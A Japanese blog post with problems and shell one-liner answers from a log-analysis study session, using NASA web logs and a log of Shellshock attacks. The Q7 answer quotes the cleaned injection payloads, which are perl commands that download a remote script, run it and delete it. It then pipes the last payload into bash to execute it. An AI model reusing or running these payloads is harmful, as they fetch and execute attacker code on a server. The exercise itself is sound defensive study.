---
Keywords:ログ,apache,CLI,Linux,shellshock,UNIX/Linuxサーバ,USP友の会,勉強会,シェル芸,シェル芸勉強会
Copyright: (C) 2017 Ryuichi Ueda
---

# 【問題と解答例】第16回春だからログ解析するぞシェル芸勉強会
<a href="http://blog.ueda.asia/?p=5851" title="【問題のみ】第16回春だからログ解析するぞシェル芸勉強会">問題のみのページはコチラ</a><br />
<br />
<h1>始める前に</h1><br />
<br />
<h2>イントロのスライド</h2><br />
<br />
<iframe src="//www.slideshare.net/slideshow/embed_code/key/6Z4FO3TXgFiUjA" width="425" height="355" frameborder="0" marginwidth="0" marginheight="0" scrolling="no" style="border:1px solid #CCC; border-width:1px; margin-bottom:5px; max-width: 100%;" allowfullscreen> </iframe> <div style="margin-bottom:5px"> <strong> <a href="//www.slideshare.net/ryuichiueda/20150418-16" title="20150418 第16回シェル芸勉強会スライド" target="_blank">20150418 第16回シェル芸勉強会スライド</a> </strong> from <strong><a href="//www.slideshare.net/ryuichiueda" target="_blank">Ryuichi Ueda</a></strong> </div><br />
<br />
<!--more--><br />
<h2>使用するログ</h2><br />
<br />
<a href="http://blog.ueda.asia/?page_id=5649" target="_blank">http://blog.ueda.asia/?page_id=5649</a>内の、access.log_.shellshock.gzとaccess_log.nasa.gzです。<br />
<br />
<h2>環境</h2><br />
今回はLinuxで解答例を作りましたので、BSD系、Macな方は以下の表をご参考に・・・。<br />
<br />
<table><br />
 <tr><br />
 <th>Mac,BSD系</th><br />
 <th>Linux</th><br />
 </tr><br />
 <tr><br />
 <td>gdate</td><br />
 <td>date</td><br />
 </tr><br />
 <tr><br />
 <td>gsed</td><br />
 <td>sed</td><br />
 </tr><br />
 <tr><br />
 <td>tail -r</td><br />
 <td>tac</td><br />
 </tr><br />
 <tr><br />
 <td>gtr</td><br />
 <td>tr</td><br />
 </tr><br />
 <tr><br />
 <td>gfold</td><br />
 <td>fold</td><br />
 </tr><br />
</table><br />
<br />
<h2>準備0</h2><br />
<br />
ログをとってきましょう。<br />
<br />
[bash]<br />
$ wget http://blog.ueda.asia/misc/access_log.nasa.gz<br />
$ wget http://blog.ueda.asia/wp-content/uploads/2015/04/access.log_.shellshock.gz<br />
[/bash]<br />
<br />
<h2>準備1</h2><br />
<br />
access.log.shellshock.gzとaccess_log.nasa.gzについて、日付と時刻を次のように正規化しておきましょう。<br />
<br />
[bash]<br />
###修正前###<br />
ueda\@tencore:~/tmp/nasa$ zcat access_log.nasa.gz | head -n 1<br />
199.72.81.55 - - [01/Jul/1995:00:00:01 -0400] &quot;GET /history/apollo/ HTTP/1.0&quot; 200 6245<br />
###修正後###<br />
ueda\@tencore:~/tmp/nasa$ cat access_log | head -n 1<br />
19950701 000001 199.72.81.55 - - [01/Jul/1995:00:00:01 -0400] &quot;GET /history/apollo/ HTTP/1.0&quot; 200 6245<br />
[/bash]<br />
<br />
<h2>解答</h2><br />
<br />
[bash]<br />
ueda\@tencore:~/tmp/nasa$ zcat access_log.nasa.gz | awk '{print $4,$0}' |<br />
 sed 's/^\\[//' | awk '{gsub(/[\\/:]/,&quot; &quot;,$1);print}' |<br />
 awk '{$2=$2==&quot;Jul&quot;?&quot;07&quot;:$2;$2=$2==&quot;Aug&quot;?&quot;08&quot;:$2;print}' |<br />
 sed 's;^\\(..\\) \\(..\\) \\(....\\) \\(..\\) \\(..\\) \\(..\\);\\3\\2\\1 \\4\\5\\6;' &gt; access_log<br />
ueda\@tencore:~/tmp/danger$ zcat access.log.shellshock.gz | awk '{print $4,$0}' |<br />
 sed 's/^\\[//' | awk '{gsub(/[\\/:]/,&quot; &quot;,$1);print}' |<br />
 sed -e 's/Sep/09/' -e 's/Oct/10/' -e 's/Nov/11/' -e 's/Dec/12/' |<br />
 sed 's;^\\(..\\) \\(..\\) \\(....\\) \\(..\\) \\(..\\) \\(..\\);\\3\\2\\1 \\4\\5\\6;' &gt; danger_log<br />
[/bash]<br />
<br />
ちゃんと変換できているか確認する方法は、例えば次の通り。<br />
<br />
[bash]<br />
ueda\@tencore:~/tmp/nasa$ awk '{print $1}' access_log | uniq | sort -u | less<br />
ueda\@tencore:~/tmp/nasa$ awk '{print $2}' access_log | grep -vE '^[0-9]{6}$'<br />
[/bash]<br />
<br />
<br />
<h2>準備2</h2><br />
<br />
NASAのログを各日付のファイルに分けておきましょう。ログはQ1で作ったものを使います。1,2行目の8桁日付、6桁時刻は残っていても構いません。<br />
<br />
<h2>解答</h2><br />
<br />
やり方を知っていれば簡単ですね。<br />
<br />
[bash]<br />
ueda\@tencore:~/tmp/nasa$ cat access_log | awk '{print $0 &gt; $1}' <br />
[/bash]<br />
<br />
<br />
<h2>Q1</h2><br />
<br />
NASAのログについて、ステータスコードを抽出して、どのコードがいくつあるか数えてみましょう。<br />
<br />
<h2>解答</h2><br />
<br />
NASAのログについては、後ろからフィールドを数える方法を使うことに気づけば簡単です。<br />
<br />
[bash]<br />
ueda\@tencore:~/tmp/nasa$ awk '{print $(NF-1)}' access_log |<br />
 LANG=C sort | uniq <br />
c-3100522 200<br />
 73070 302<br />
 266773 304<br />
 15 400<br />
 225 403<br />
 20901 404<br />
 65 500<br />
 41 501<br />
[/bash]<br />
<br />
<br />
<h2>Q2</h2><br />
<br />
NASAのログについて、ファイルを開かずに、ログの多い日を探しだしてみましょう。<br />
<br />
<h2>解答</h2><br />
<br />
lsを使ってサイズを見たら開かないでも見当がつきます。<br />
<br />
[bash]<br />
ueda\@tencore:~/tmp/nasa$ ls -l 1* | sort -k5,5n | tail <br />
-rw-rw-r-- 1 ueda ueda 9897387 4月 17 15:12 19950830<br />
-rw-rw-r-- 1 ueda ueda 9946946 4月 17 15:12 19950711<br />
-rw-rw-r-- 1 ueda ueda 10478436 4月 17 15:12 19950714<br />
-rw-rw-r-- 1 ueda ueda 10859858 4月 17 15:12 19950707<br />
-rw-rw-r-- 1 ueda ueda 11072693 4月 17 15:12 19950831<br />
-rw-rw-r-- 1 ueda ueda 11242160 4月 17 15:12 19950703<br />
-rw-rw-r-- 1 ueda ueda 11483007 4月 17 15:12 19950712<br />
-rw-rw-r-- 1 ueda ueda 11777820 4月 17 15:12 19950705<br />
-rw-rw-r-- 1 ueda ueda 12583986 4月 17 15:12 19950706<br />
-rw-rw-r-- 1 ueda ueda 16557952 4月 17 15:12 19950713<br />
[/bash]<br />
<br />
<br />
<h2>Q3</h2><br />
<br />
NASAのログについて、（Q3-1）ログの件数が一番多い曜日はどれでしょうか。（Q3-2）ログの件数が一番多い時間帯（時間帯というのは0時台、1時台、・・・、23時台のこと）はどれでしょうか。<br />
<br />
Q3-2については高速な方法を考えてみてください。<br />
<br />
<h2>解答</h2><br />
<br />
（Q3-1）次のように木曜日。<br />
<br />
[bash]<br />
ueda\@tencore:~/tmp/nasa$ awk '{print $1}' access_log | date -f - &quot;+%w&quot; |<br />
 LANG=C sort | uniq -c | sort -k1,1n<br />
 317276 0<br />
 318046 6<br />
 497456 5<br />
 529960 1<br />
 556590 2<br />
 574547 3<br />
 667737 4<br />
[/bash]<br />
<br />
（Q3-2）時間をどう切り出すかが鍵です。<br />
<br />
[bash]<br />
ueda\@tencore:~/tmp/nasa$ awk '{print substr($2,1,2)}' access_log |<br />
 sort | uniq -c | sort -k1,1nr | head<br />
 230665 15<br />
 227228 12<br />
 225350 13<br />
 223873 14<br />
 217564 16<br />
 211064 11<br />
 193816 10<br />
 178664 09<br />
 178443 17<br />
 149193 08<br />
###データが多いと、sortしない分だけこの方が早い###<br />
ueda\@tencore:~/tmp/nasa$ time awk '{a[substr($2,1,2)]++}END{for(v in a){print v,a[v]}}' access_log |<br />
 sort -k2,2nr | head <br />
15 230665<br />
12 227228<br />
13 225350<br />
14 223873<br />
16 217564<br />
11 211064<br />
10 193816<br />
09 178664<br />
17 178443<br />
08 149193<br />
<br />
real	0m1.448s<br />
user	0m1.387s<br />
sys	0m0.066s<br />
###LANG=Cを指定するとさらに速くなる###<br />
ueda\@tencore:~/tmp/nasa$ LANG=C time awk '{a[substr($2,1,2)]++}END{for(v in a){print v,a[v]}}' access_log |<br />
 sort -k2,2nr | head <br />
1.24user 0.06system 0:01.30elapsed 99%CPU (0avgtext+0avgdata 1148maxresident)k<br />
0inputs+0outputs (0major+338minor)pagefaults 0swaps<br />
15 230665<br />
12 227228<br />
13 225350<br />
14 223873<br />
16 217564<br />
11 211064<br />
10 193816<br />
09 178664<br />
17 178443<br />
08 149193<br />
[/bash]<br />
<br />
<h2>Q4</h2><br />
<br />
ShellShockログ内にあるIPアドレス（IPv4）がすべて192.168.から始まることを確認して下さい。IPアドレスはレコードの先頭だけでなく、インジェクションするコードの中にもあるのでご注意ねがいます。<br />
<br />
<h2>解答</h2><br />
<br />
[bash]<br />
ueda\@remote:~$ zcat access.log.shellshock.gz | grep -Eo '([0-9]+\\.){3}[0-9]+' |<br />
 awk -F. '{print $1,$2}' | uniq<br />
192 168<br />
[/bash]<br />
<br />
<h2>Q5</h2><br />
<br />
ShellShockログについて、レスポンスのデータ送信量が大きいものを、IPアドレスと共に上から10件を挙げてみましょう。<br />
<br />
<h2>解答</h2><br />
<br />
[bash]<br />
ueda\@tencore:~/tmp/danger$ zcat access.log.shellshock.gz |<br />
 sed 's/^\\([0-9]\\+\\.[0-9]\\+\\.[0-9]\\+\\.[0-9]\\+\\) .*&quot; [0-9][0-9][0-9] \\([0-9]\\+\\) &quot;.*$/\\1 \\2/' |<br />
 sort -k2,2nr | head<br />
192.168.0.90 234<br />
192.168.151.207 234<br />
192.168.151.207 234<br />
192.168.151.207 234<br />
192.168.151.207 234<br />
192.168.151.207 234<br />
192.168.151.207 234<br />
192.168.151.207 234<br />
192.168.151.207 234<br />
192.168.193.42 234<br />
[/bash]<br />
<br />
<h2>Q6</h2><br />
<br />
NASAのログについて、7月8月のうち、ゼロ件の日を列挙してみてください。<br />
<br />
<br />
<h2>解答</h2><br />
<br />
[bash]<br />
###ログの存在しない日（解法1: ツーライナーで）###<br />
ueda\@tencore:~/tmp/nasa$ seq -w 01 31 | awk '{print &quot;199507&quot; $1;print &quot;199508&quot; $1}' | sort &gt; days<br />
ueda\@tencore:~/tmp/nasa$ awk '{print $1}' access_log | LANG=C sort -u | cat - days |<br />
 sort | uniq -u<br />
19950729<br />
19950730<br />
19950731<br />
19950802<br />
###Tukubaiでワンライナー###<br />
ueda\@tencore:~/tmp/nasa$ awk '{print $1}' access_log | LANG=C sort -u |<br />
 cat - &lt;(mdate -e 19950701 19950831)| tarr | sort | uniq -u<br />
19950729<br />
19950730<br />
19950731<br />
19950802<br />
###ガチでワンライナー###<br />
ueda\@tencore:~/tmp/nasa$ awk '{print $1}' access_log | LANG=C sort -u |<br />
 cat - &lt;(echo 19950{7,8}{01..31}) | tr ' ' '\\n' | sort | uniq -u<br />
19950729<br />
19950730<br />
19950731<br />
19950802<br />
[/bash]<br />
<br />
<br />
<h2>Q7</h2><br />
<br />
ShellShockのログから、（Q7-1）インジェクションが試みられたコード（「() { :;};」から後ろ）を抽出してみて傾向を話あってみましょう。（Q7-2）出来る人はエスケープも掃除してコードを復元してみましょう。（Q7-3）更にできる人は最後の行のコードを実行してみてください。<span style="color:red">このログはIPアドレスを変換しているので安全ですが、普通のログでやると死にますのでご注意を。</span><br />
<br />
<h2>解答</h2><br />
<br />
とりあえずこれで読みやすくなりますね。<br />
<br />
[bash]<br />
###Q7-1 コードを抽出###<br />
ueda\@tencore:~/tmp/danger$ cat danger_log | sed 's/^.*()/()/'<br />
###Q7-2 コードの掃除###<br />
ueda\@tencore:~/tmp/danger$ cat danger_log | sed 's/^.*()/()/' |<br />
 sed 's/\\\\&quot;/&quot;/g' | sed 's/\\\\\\\\/\\\\/g' | sed 's/&quot;$//'<br />
...<br />
() { :;};/usr/bin/perl -e 'print &quot;Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!&quot;;system(&quot;wget http://192.168.144.163/guide/lx.pl -O /tmp/lx.pl;curl -O /tmp/lx.pl http://192.168.144.163/guide/lx.pl;perl /tmp/lx.pl;rm -rf /tmp/lx.pl*&quot;);'<br />
() { :;};/usr/bin/perl -e 'print &quot;Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!&quot;;system(&quot;wget -q http://192.168.63.71/android.txt -O /tmp/android.txt;perl /tmp/android.txt;rm -rf /tmp/android*&quot;);'<br />
###Q7-3 コードの実行（危ない！）###<br />
ueda\@tencore:~/tmp/danger$ tail -n 1 danger_log | sed 's/^.*()/()/' |<br />
 sed 's/\\\\&quot;/&quot;/g' | sed 's/\\\\\\\\/\\\\/g' | sed 's/&quot;$//' |<br />
 sed 's/.........//' | bash -vx<br />
/usr/bin/perl -e 'print &quot;Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!&quot;;system(&quot;wget -q http://192.168.63.71/android.txt -O /tmp/android.txt;perl /tmp/android.txt;rm -rf /tmp/android*&quot;);'<br />
+ /usr/bin/perl -e 'print &quot;Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!&quot;;system(&quot;wget -q http://192.168.63.71/android.txt -O /tmp/android.txt;perl /tmp/android.txt;rm -rf /tmp/android*&quot;);'<br />
Content-Type: text/plain<br />
<br />
XSUCCESS!<br />
（wgetが失敗するのでCtrl+cで出る。）<br />
[/bash]<br />
<br />
<br />

